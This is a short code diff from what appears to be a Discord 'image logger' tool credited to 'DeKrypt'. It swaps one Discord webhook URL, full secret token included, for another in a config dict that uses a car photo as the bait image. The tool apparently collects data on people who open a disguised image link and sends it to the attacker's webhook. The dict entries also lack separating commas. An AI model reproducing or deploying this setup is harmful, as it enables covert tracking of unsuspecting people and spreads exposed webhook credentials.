@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook":'https://discord.com/api/webhooks/1444648077658034278/XRdq-YQ9420aiQuhL6zLVbVcwh29yPxdG4Z8QQV6nqG9izAx3_9KXk3HOcab7X9JKNKb'
+    "webhook":'https://discord.com/api/webhooks/1444653242104676543/On_8rkYJ5idCXVANKqv4ODO-WjLW56XSO5V6iIi6Xz0cA4drT1gc33kSO4QxU3QTpN89'
     "image": "https://imgd.aeplcdn.com/1920x1080/n/cw/ec/204994/amg-gt-63-exterior-right-front-three-quarter-2.png?isig=0&q=80&q=80"                                              # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
